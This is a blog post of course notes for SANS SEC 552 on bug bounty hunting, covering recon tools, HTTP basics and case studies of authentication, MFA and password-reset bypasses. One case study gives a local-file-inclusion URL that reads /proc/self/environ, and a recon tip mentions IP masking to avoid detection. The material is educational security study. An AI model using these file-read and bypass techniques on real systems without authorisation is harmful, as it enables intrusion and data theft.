<!doctype html>
<html lang="en-us">
  <head>
    <title>SANS SEC 552 Cheatsheet (Bug Bounties and Responsiple Disclosure) // 0xSlaxo Blog</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.101.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="Abdelrhman Allam" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://sl4x0.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SANS SEC 552 Cheatsheet (Bug Bounties and Responsiple Disclosure)"/>
<meta name="twitter:description" content="App Analysis, Logic, and SQL Attacks 💡 Course is inspired from case studies found in various bug bounty programs related to web and mobile app attacks. It will help in catching and reporting tricky web and mobile app security bugs that are commonly reported in bug bounty programs.
The Hunter’s Challenge JOINING A PROGRAM
💡 Security researchers can choose from many bug bounty programs available, either from the vendor directly or through a bug bounty platform (HackerOne, Bugcrowd, Synack&hellip;)"/>

    <meta property="og:title" content="SANS SEC 552 Cheatsheet (Bug Bounties and Responsiple Disclosure)" />
<meta property="og:description" content="App Analysis, Logic, and SQL Attacks 💡 Course is inspired from case studies found in various bug bounty programs related to web and mobile app attacks. It will help in catching and reporting tricky web and mobile app security bugs that are commonly reported in bug bounty programs.
The Hunter’s Challenge JOINING A PROGRAM
💡 Security researchers can choose from many bug bounty programs available, either from the vendor directly or through a bug bounty platform (HackerOne, Bugcrowd, Synack&hellip;)" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://sl4x0.github.io/bug-bounty/sec-552-cheatsheet/" /><meta property="article:section" content="bug-bounty" />
<meta property="article:published_time" content="2022-11-29T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-11-29T00:00:00+00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://sl4x0.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Abdelrhman Allam" /></a>
      <h1>0xSlaxo Blog</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/about/">About</a>
             - 
          
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
             - 
          
          <a class="app-header-menu-item" href="/whoami/">WHOAMI</a>
      </nav>
      <p>CS Student | Security Researcher</p>
      <div class="app-header-social">
        
          <a href="https://github.com/sl4x0" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>My Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://www.facebook.com/sl4x0" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
  <title>My facebook</title>
  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
</svg>
          </a>
        
          <a href="https://twitter.com/sl4x0" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>My Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
          <a href="https://linkedin.com/in/sl4x0" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>My Twitter</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">SANS SEC 552 Cheatsheet (Bug Bounties and Responsiple Disclosure)</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Nov 29, 2022
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          42 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://sl4x0.github.io/tags/web-notes/">Web-Notes</a>
              <a class="tag" href="https://sl4x0.github.io/tags/bug-bounty/">bug-bounty</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <p><img src="https://i.imgur.com/OhjoU7L.jpeg" alt=""></p>
<h1 id="app-analysis-logic-and-sql-attacks">App Analysis, Logic, and SQL Attacks</h1>
<p>💡 Course is inspired from case studies found in various bug bounty programs related to web and mobile app attacks. It will help in catching and reporting tricky web and mobile app security bugs that are commonly reported in bug bounty programs.</p>
<h2 id="the-hunters-challenge">The Hunter’s Challenge</h2>
<p>JOINING A PROGRAM</p>
<p>💡 Security researchers can choose from many bug bounty programs available, either from the vendor directly or through a bug bounty platform (HackerOne, Bugcrowd, Synack&hellip;)</p>
<p>A good list for available published programs that offer bounty, swag, or honorable mention in hall of fame list is available on <a href="https://www.bugcrowd.com/bug-bounty-list/">Bugcrowd Bug Bounty List</a></p>
<p>Researchers can join private programs in bug bounty platforms by invitation only.
Building a <a href="https://docs.hackerone.com/hackers/reputation.html">reputation</a> by gathering points can help in getting invited</p>
<p>For more Programs :</p>
<p><a href="https://www.vulnerability-lab.com/list-of-bug-bounty-programs.php">List of Bug Bounty Programs 2020 International 537+ Official - Best Bug Bounty Programs and Bug Bounty Platform (vulnerability-lab.com)</a></p>
<h4 id="live-hacking-events">LIVE HACKING EVENTS</h4>
<p>💡 At live hacking events, hackers hunt on a new platform that has not been released to the public yet. Live hacking events are typically invitation-only, and you will have to earn your way in. Sometimes, hunters can invite a plus one to join them, so it pays to get involved in the community and connect with fellow hunters.</p>
<h4 id="be-the-first-1">BE THE FIRST (1)</h4>
<p>💡 - Test the app as if it were never tested before
Your mindset can guide you to discovering bugs that are not discovered by other researchers.</p>
<ul>
<li>
<p>Spend decent time with a single app
Gives proper time for mapping and deeply understanding the app business logic.</p>
</li>
<li>
<p>Focus on apps with rich business and logic which opens wider attack surface</p>
</li>
<li>
<p>Test recent acquisitions or partners apps that are in scope as vendors mostly give more
attention to the main app</p>
</li>
</ul>
<h4 id="be-the-first-2">BE THE FIRST (2)</h4>
<p>💡 - Choose the right project</p>
<ul>
<li>Perform thorough reconnaissance</li>
<li>Review open-source code</li>
<li>Monitor the community</li>
<li>Keep extensive documentation</li>
<li>Acquire in-depth knowledge</li>
<li>Find new attack categories</li>
<li>Acquire privileged access</li>
<li>Think outside the box</li>
<li>Use automation</li>
</ul>
<h4 id="the-right-project-1">THE RIGHT PROJECT (1)</h4>
<p>💡 Normal web applications
Mobile applications
Games &amp; Gaming consoles
Internet of Things
Open-Source projects 
Protocols</p>
<h4 id="the-right-project-2">THE RIGHT PROJECT (2)</h4>
<p>💡 Each type of project will have a different weak point that needs to be addressed.</p>
<p>APIs Games, mobile apps and IoT will all have APIs which you might already be familiar with. This is a great way to start in those categories</p>
<h4 id="review-open-source-code">REVIEW OPEN-SOURCE CODE</h4>
<p>💡 Practice by performing code reviews on projects with open-source code.</p>
<p>You can learn from these projects how they work and what the code does.</p>
<p>While open-source projects don’t always reward bounties, you can still gain a CVE</p>
<h4 id="monitor-the-community">MONITOR THE COMMUNITY</h4>
<p>💡 Social media such as Reddit, Twitter, and LinkedIn</p>
<p>Public disclosures</p>
<p>Many security researches wrote blogposts</p>
<p>Links:</p>
<p><a href="https://portswigger.net/research">Web Security Research Papers - PortSwigger Research</a></p>
<p><a href="https://blog.intigriti.com/">Intigriti - Bug Bounty &amp; Agile Pentesting Platform</a></p>
<p><a href="https://hackerone.com/hacktivity">Hacktivity (hackerone.com)</a></p>
<p><a href="https://medium.com/bugbountywriteup/tagged/bug-bounty">medium.com</a></p>
<h4 id="acquire-privileged-access">ACQUIRE PRIVILEGED ACCESS</h4>
<p>💡 Customer side Supplier side Focused on security Focused on speed
Looks appealing for the clients Has to be functional</p>
<h4 id="acquire-in-depth-knowledge">ACQUIRE IN-DEPTH KNOWLEDGE</h4>
<p>💡 Language : Every programming language is unique, and they all have different quirks
Frameworks : Frameworks have different out-of-thebox features</p>
<p><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">Services</a> : Services can be a hidden attack surface that can lead to more than one bounty</p>
<h4 id="find-new-attack-categories">FIND NEW ATTACK CATEGORIES</h4>
<p>💡 While this is exponentially more difficult than &ldquo;normal&rdquo; Bug Bounty hunting, it also holds more profit if successful. When you discover a new attack category, you don&rsquo;t have to disclose it to the public immediately, but you should start by applying your new attack vectors to known Bug Bounty projects, and this way you can have a head start on the competition. Depending on your discovery, you could be sitting on a gold mine if many platforms are vulnerable.</p>
<ol>
<li>Find common misconfigurations</li>
<li>Find discrepancies between interpretations of standards</li>
<li>Fuzz on local instances</li>
</ol>
<h4 id="thorough-reconnaissance">THOROUGH RECONNAISSANCE</h4>
<p>💡 Both for narrow and wildcard scope, it’s important to find the entire attack surface.</p>
<p>Finding functionality that others haven’t viewed yet:</p>
<p>Visit from different country
Special birthday event
Deprecated APIs
Alternate/legacy protocols
…</p>
<h4 id="automation">AUTOMATION</h4>
<p>💡 Most of the automation will be done in the recon phase, as the vulnerability discovery phase should preferably be done manually.</p>
<p>Ways to automate your recon:</p>
<ol>
<li>Create your own environment</li>
<li>Use the right tools</li>
<li>24/7 monitoring</li>
<li>Watch your speed</li>
</ol>
<h4 id="keep-extensive-documentation">KEEP EXTENSIVE DOCUMENTATION</h4>
<p>💡 1. Easily queryable
2. Cloud or local
3. Information from previous projects
4. Secure
5. Archived projects can be compressed
6. Scan outputs and findings</p>
<h4 id="create-your-own-environment">CREATE YOUR OWN ENVIRONMENT</h4>
<p>💡 While creating your own environment might be a big task, it will surely reward your hard work since the result will be a personalized workspace tailored to your needs. A few tricks to do this include:
• Have a look at other tools
• Use the same output format and parse outputs that do not adhere to the same standard
• Use central storage
• Use version control to spot sudden changes in projects
• …</p>
<h4 id="use-the-right-tools">USE THE RIGHT TOOLS</h4>
<p>💡 Existing tools :</p>
<ul>
<li>Little time investment</li>
<li>Might not be 100% what you want</li>
<li>Hard to extend on</li>
</ul>
<p>Create your own:</p>
<ul>
<li>Medium to large time investment</li>
<li>100% what you want</li>
<li>Can be made to be modular</li>
</ul>
<p><em>Remember to double-check if there is no existing tool already; never do what somebody has already done for you.</em></p>
<h4 id="kali">KALI</h4>
<p>💡 Kali is a Debian-based, security-oriented operating system that has a collection of
security testing tools built in.</p>
<h4 id="typical-recon-steps">TYPICAL RECON STEPS</h4>
<p>💡 - Certificate transparency</p>
<ul>
<li>BB Scope</li>
<li>Portscans</li>
</ul>
<p>-Subdomains</p>
<ul>
<li>Subdirectories, crawling, OSINT</li>
</ul>
<h4 id="sub-domain-enumeration">(SUB) DOMAIN ENUMERATION</h4>
<p>💡 - OSINT / <a href="https://www.exploit-db.com/google-hacking-database">Google dorks</a></p>
<ul>
<li><a href="https://crt.sh/">Certificate transparency logs</a></li>
<li>DNS enumeration tools</li>
<li>Crawl the application</li>
<li>Wayback Machine</li>
</ul>
<p>Tools: 
<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a>,</p>
<p><a href="https://github.com/fwaeytens/dnsenum">https://github.com/fwaeytens/dnsenum</a>,</p>
<p><a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a>,</p>
<p><a href="https://github.com/darkoperator/dnsrecon">https://github.com/darkoperator/dnsrecon</a>,</p>
<p><a href="https://github.com/hakluke/hakrawler">https://github.com/hakluke/hakrawler</a></p>
<p>Links:</p>
<p><a href="https://linux.die.net/man/1/dig">https://linux.die.net/man/1/dig</a></p>
<p><a href="https://nmap.org/nsedoc/scripts/dns-brute.html">https://nmap.org/nsedoc/scripts/dns-brute.html</a></p>
<p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p>
<h4 id="interesting-tools">INTERESTING TOOLS</h4>
<p>💡 <strong>Active scanners</strong>: Actively engage with the server, these put a heavy load on the server and are often forbidden</p>
<ul>
<li>AssetFinder <a href="https://github.com/tomnomnom/assetfinder">https://github.com/tomnomnom/assetfinder</a></li>
<li>HTTProbe <a href="https://github.com/tomnomnom/httprobe">https://github.com/tomnomnom/httprobe</a></li>
<li>HostileSub Bruteforcer <a href="https://github.com/nahamsec/HostileSubBruteforcer">https://github.com/nahamsec/HostileSubBruteforcer</a></li>
<li>Seltzer <a href="https://github.com/10goto20/seltzer">https://github.com/10goto20/seltzer</a></li>
<li>Meg <a href="https://github.com/tomnomnom/meg">https://github.com/tomnomnom/meg</a></li>
<li>Lazy S3 <a href="https://github.com/nahamsec/lazys3">https://github.com/nahamsec/lazys3</a></li>
</ul>
<p>💡 Passive scanners: These do not directly engage the server. They connect to third-party applications.</p>
<ul>
<li>JS-Scan <a href="https://github.com/tomnomnom/JS-Scan">https://github.com/tomnomnom/JS-Scan</a></li>
<li>JSParser <a href="https://github.com/nahamsec/JSParser">https://github.com/nahamsec/JSParser</a></li>
<li>Crtndstry <a href="https://github.com/nahamsec/crtndstry">https://github.com/nahamsec/crtndstry</a></li>
</ul>
<p>💡 All-in-one scanners: A collection of different scanners, to collect as much information as possible.</p>
<ul>
<li>EnumX.sh <a href="https://github.com/xElkomy/Workflow-Bug-Bounty">https://github.com/xElkomy/Workflow-Bug-Bounty</a></li>
<li>Lazyrecon <a href="https://github.com/nahamsec/lazyrecon">https://github.com/nahamsec/lazyrecon</a></li>
<li>OneForAll  <a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li>
<li>ReconPi <a href="https://github.com/x1mdev/ReconPi">https://github.com/x1mdev/ReconPi</a></li>
</ul>
<p>💡 Bug Bounty tools: Not really scanners; however, they will increase your quality of life.</p>
<p><a href="https://github.com/devanshbatham/Awesome-Bugbounty-Writeups">https://github.com/devanshbatham/Awesome-Bugbounty-Writeups</a></p>
<p><a href="https://github.com/EdOverflow/bugbounty-cheatsheet">https://github.com/EdOverflow/bugbounty-cheatsheet</a></p>
<p><a href="https://github.com/hahwul/WebHackersWeapons">https://github.com/hahwul/WebHackersWeapons</a></p>
<p><a href="https://github.com/nahamsec/bbht">https://github.com/nahamsec/bbht</a></p>
<p><a href="https://github.com/nahamsec/recon_profile">https://github.com/nahamsec/recon_profile</a></p>
<h4 id="247-monitoring">24/7 MONITORING</h4>
<p>💡 Single-board computers are:</p>
<ul>
<li>More hands-on</li>
<li>Cost efficient</li>
<li>Slower</li>
</ul>
<p>Cloud servers are:</p>
<ul>
<li>Easy</li>
<li>More pricey</li>
<li>Faster</li>
</ul>
<h4 id="watch-your-speed">WATCH YOUR SPEED</h4>
<p>💡 - When engaging directly with the endpoint, be sure to limit your speed, as too many requests can get you blocked.</p>
<ul>
<li>
<p>Keep in mind that the environment you are on is most likely production</p>
</li>
<li>
<p>IP masking and throttling can help in avoiding detection.</p>
</li>
<li>
<p>Automated scans Often not allowed because they cause a heavy load on the
application and may have consequences for normal users</p>
</li>
</ul>
<h4 id="legal">LEGAL</h4>
<p>💡 Bug Bounty hunting can be dangerous if you’re not very careful in your approach. If you violate the target company&rsquo;s terms and conditions, you might end up with a lawsuit or even end up in jail. Some security researchers have had charges against them because they were not careful and violated the scope terms and conditions. So that&rsquo;s why they are very important and should always be abided.</p>
<ol>
<li>Read the scope before you start testing</li>
<li>Read the scope again before you report</li>
<li>Make sure that you declare your taxes</li>
</ol>
<h4 id="responsible-disclosure">RESPONSIBLE DISCLOSURE</h4>
<p>💡 Don’t perform intrusive actions
Seek help from OpenBugBounty, HackerOne …
Sometimes better to let it go</p>
<hr>
<h2 id="http-review">HTTP Review</h2>
<h4 id="http-get-request">HTTP GET REQUEST</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># URL Parameters
</span></span><span style="display:flex;"><span>GET /main?id=123&amp;lang=English HTTP/1.1
</span></span><span style="display:flex;"><span>Host: www.sec552.org
</span></span><span style="display:flex;"><span>User‐agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)…
</span></span><span style="display:flex;"><span>Cookie: sessionid=12345678
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># URL Rewrite Format
</span></span><span style="display:flex;"><span>GET /main/id/123/lang/English HTTP/1.1
</span></span><span style="display:flex;"><span>Host: www.sec552.org
</span></span><span style="display:flex;"><span>User‐agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)…
</span></span><span style="display:flex;"><span>Cookie: sessionid=12345678
</span></span></code></pre></div><h4 id="http-post-request">HTTP POST REQUEST</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># URL &amp; Body Params
</span></span><span style="display:flex;"><span>POST /main?id=123 HTTP/1.1
</span></span><span style="display:flex;"><span>Host: www.sec552.org
</span></span><span style="display:flex;"><span>Content‐Type: application/x‐www‐form‐urlencoded
</span></span><span style="display:flex;"><span>Content‐Length: 22
</span></span><span style="display:flex;"><span>User=test&amp;role=admin
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># JSON Format
</span></span><span style="display:flex;"><span>POST /api/user/1 HTTP/1.1
</span></span><span style="display:flex;"><span>Host: www.sec552.org
</span></span><span style="display:flex;"><span>Content‐Type: application/json
</span></span><span style="display:flex;"><span>Content‐Length: 26
</span></span><span style="display:flex;"><span>{&#34;enabled&#34;:true,&#34;name&#34;:&#34;test&#34;}
</span></span></code></pre></div><h4 id="http-proxy-burp-suite">HTTP PROXY: Burp Suite</h4>
<p>💡 HTTP proxy will be our main tool to use while hunting for bugs. It enables us to intercept HTTP requests sent between the client (browser or mobile) and the server. We will be able analyze requests and responses. Moreover, we will be able to send attack payloads to the app.</p>
<hr>
<h2 id="understanding-the-app">Understanding the App</h2>
<h4 id="understanding-the-app-1">UNDERSTANDING THE APP</h4>
<p>💡 - Understand the features and the business logic of the app</p>
<ul>
<li>Identify the components of the app and how they interact together</li>
<li>Analyze the workflow of inputs and outputs of the application</li>
<li>Doing such analysis will help build attacks related to the app context</li>
</ul>
<h4 id="identifying-app-components">IDENTIFYING APP COMPONENTS</h4>
<p>💡 Assume that we are dealing with an internet banking application. Examples of app sections include:
• Search
• Profile
• Bill pay
• Transfers
• Account statement
• Administration</p>
<ul>
<li>Ultimate goal is to discover all app components and map full execution path</li>
<li>Manually navigating to different app features using different user profiles and scenarios while inspecting the HTTP proxy</li>
<li>Inspecting parameter values and how their values control the app business flow</li>
<li>Analyzing responses and following redirections to deeply understand the app business flow</li>
</ul>
<h4 id="completing-the-puzzle">COMPLETING THE PUZZLE</h4>
<p>💡 <code>$.ajax('/v2/api/Admin/addUser')</code> <code>=&gt;</code> Client-side code analysis to discover run-time generated links 
Using <a href="https://www.exploit-db.com/google-hacking-database">search engines</a> to discover indexed or <strong>cached links</strong> 
Enumeration to discover links that are <strong>hidden</strong> from the GUI</p>
<h4 id="translating-business-into-http-requests">TRANSLATING BUSINESS INTO HTTP REQUESTS</h4>
<p>💡 Understand the app functions and identify how HTTP requests are created when using different features with different users’ profiles Determine the purpose of input parameters, such as:
• URL
• Body
• Cookie
• Header</p>
<h4 id="parameters-analysis-and-context">PARAMETERS ANALYSIS AND CONTEXT</h4>
<p>💡 Understand the purpose and context of each parameter sent to the app and inspect app behavior when manipulating parameter values.</p>
<p><code>/showAccount?listAccounts=800002</code>
<code>/showAccount?listAccounts=800009</code>
<code>/showAccount?listAccounts=0</code>
<code>/showAccount?listAccounts=Blah</code></p>
<!-- raw HTML omitted -->
<h4 id="attack-context">ATTACK CONTEXT</h4>
<p>💡 Picking the attacks will depend on the business meaning of the parameter
We are paying for cart id 946598 by the redeem code 1a2b</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>POST /cart/946598/payment HTTP/1.1
</span></span><span style="display:flex;"><span>Host: app
</span></span><span style="display:flex;"><span>Content‐Length: 67
</span></span><span style="display:flex;"><span>Cookie: sessionid=A29808d511cd12fbdcd
</span></span><span style="display:flex;"><span>redeem_type=1&amp;claim_code=1a2b
</span></span></code></pre></div><h4 id="request-parameters-and-server-logic">REQUEST PARAMETERS AND SERVER LOGIC</h4>
<p>💡 Server-side code can behave differently depending on passed request parameters names and values
The code checks on the existence of role and userid parameters in the request received by the server</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span> ($_POST[<span style="color:#e6db74">&#34;role&#34;</span>])){
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Retrieve all the users having a specific role
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span> ($_POST[<span style="color:#e6db74">&#34;userid&#34;</span>])){
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Retrieve user info with a specific user id
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><hr>
<h3 id="bug-bounty-case-study">BUG BOUNTY CASE STUDY</h3>
<p>💡
<a href="https://omespino.com/write-up-google-bug-bounty-lfi-on-production-servers-in-redacted-google-com-13337-usd/">Unauthorized access to local files at Google</a></p>
<p>Vulnerability allowed unauthorized access to local files on
“<a href="http://springboard.google.com/">SPRINGBOARD.GOOGLE.COM</a>”</p>
<p>ENUMERATION ON DIRECTORIES
<a href="https://springboard.google.com/REDACTED_DIR/">https://springboard.google.com/REDACTED_DIR/</a></p>
<p>INTERESTING PARAMETER</p>
<p><a href="https://springboard.google.com/REDACT_DIR/ANOTHER_DIR?file=/proc/self/environ">https://springboard.google.com/REDACT_DIR/ANOTHER_DIR?file=/proc/self/environ</a></p>
<hr>
<h2 id="authentication-and-session">Authentication and Session</h2>
<p>💡</p>
<ol>
<li>Log In</li>
<li>Check</li>
<li>If valid, generate session token</li>
<li>Send Token &amp; Redirect</li>
<li>Token</li>
</ol>
<p>💡 We want to do more analysis on the tokens that are generated by the server. We would like to ask such questions:
• How it is generated?
• Where it is generated?
• How does the app validate on them?
• How will the app behave when changing its values?
• When do they expire?</p>
<hr>
<h2 id="authentication-bypass">Authentication Bypass</h2>
<blockquote>
<p><em>Attacker bypasses authentication by manipulating parameters</em></p>
</blockquote>
<h3 id="oracle-flex-cube-direct-banking-case-study">ORACLE FLEX CUBE DIRECT BANKING CASE STUDY</h3>
<p>💡 CVE-2017-10181: Oracle FLEXCUBE Direct Banking
Affects versions 12.0.2 and 12.0.3
Patched July 2017
Allows changing the password of any user by just knowing his username</p>
<h3 id="normal-user-forgot-password">NORMAL USER FORGOT PASSWORD</h3>
<p>💡 User enters User ID and then enters the answer for the secret question
The user can now enter the new password. Note the HTTP request sent in this step in the process. There is an interesting parameter named <code>fldtxnrefernceno</code> sent along with the other parameters that hold the new password.</p>
<ul>
<li>Attacker enters victim’s User ID and reaches the secret question page</li>
<li>Attacker doesn’t know the secret answer to be filled; however, an interesting value was revealed in the response.</li>
<li>Attacker enters a new password while intercepting the HTTP request and replaces value of the parameter <code>fldtxnreferenceno</code> with the one he has. Once the request arrives to the server, the victim’s password will be changed by the value entered by the attacker. These types of attacks are logic and tricky to discover. The attacker had to inspect and analyze all parameters that are sent in each phase in the password reset process. The root cause of the bug is that the <code>fldtxnreferenceno</code> value was disclosed in the wrong place. The bug was fixed by avoiding sending such value in the response unless the user enters the secret answer.</li>
</ul>
<h3 id="authentication-bypass-attack">AUTHENTICATION BYPASS ATTACK</h3>
<blockquote>
<p>Attacker bypasses Multi-factor authentication by manipulating parameters</p>
</blockquote>
<p>💡 1. Navigates to Login Form
2. POST doLogin</p>
<p>User: jsmith
<code>Password: Demo123 OTP: 986254 AuthType: 2</code>
3. App checks on OTP value only if the AuthType valu is “2”</p>
<p>The parameter “AuthType” does not show in the GUI interface of the form; however, it was sent.
By changing the AuthType value it will bypass the multifactor authentication</p>
<h3 id="multi-factor-authentication-bypass-bug-bounty-case-study">MULTI-FACTOR AUTHENTICATION BYPASS BUG BOUNTY CASE STUDY</h3>
<p>💡 Two-factor authentication bypass by abusing security questions feature
Reported to PayPal Bounty: Undisclosed
<a href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass</a></p>
<p>💡 - After entering valid credentials, the application requires an OTP that is sent to the user’s phone number to verify his identity to allow him to log in</p>
<ul>
<li>Try Security Questions</li>
<li>Attacker removes the parameters of the security questions</li>
</ul>
<hr>
<h2 id="authentication-and-sessions-defenses">Authentication and Sessions Defenses</h2>
<h4 id="multi-factor-authentication-bypass-bug-bounty-case-study-1">MULTI-FACTOR AUTHENTICATION BYPASS BUG BOUNTY CASE STUDY</h4>
<p>💡 <a href="https://hackerone.com/reports/418767">https://hackerone.com/reports/418767</a></p>
<ul>
<li>Enforce the researchers to set up the two-factor authentication before submitting new reports</li>
<li>A researcher can bypass program 2FA requirements by submitting the report through Embedded Submission URL</li>
<li>Example Embedded Submission URL will look like: <a href="https://hackerone.com/0a1e1f11-257e-4b46-b949-c7151212ffbb/embedded_submissions/new">https://hackerone.com/0a1e1f11-257e-4b46-b949-c7151212ffbb/embedded_submissions/new</a></li>
</ul>
<p>💡 Another vulnerability allowed an attacker to gain access to other users&rsquo; attachments who were writing a report at the same time.
The vulnerability allowed any user to bypass multiple program restrictions, such as the 2FA requirement.</p>
<h4 id="authentication-and-sessions-defenses-1">AUTHENTICATION AND SESSIONS DEFENSES</h4>
<p>💡 - Generate server-side complex and unique tokens</p>
<ul>
<li>Proper expiry date should be set for each token according to its criticality</li>
<li>Return token to the client once verifying on credentials supplied</li>
<li>Verify on the token at the server on all operations and pages that require authentication</li>
<li>Avoid taking critical authentication decisions based on untrusted predictable input</li>
</ul>
<hr>
<h1 id="authorization-bypass">Authorization Bypass</h1>
<h4 id="authorization-and-privileges">AUTHORIZATION AND PRIVILEGES</h4>
<p>💡 Member : Normal Privilege
Business : Owners
Admin : Manger Users</p>
<p>💡 Business Rules:
•View his own accounts statements only
• Max total transactions of $10,000 per day
• Foreign transfers is allowed in USD only
• OTP for transfers exceeding $1,000</p>
<h4 id="authorization-bypass-1">AUTHORIZATION BYPASS</h4>
<blockquote>
<p>Attacker breaks business rules by manipulating parameters</p>
</blockquote>
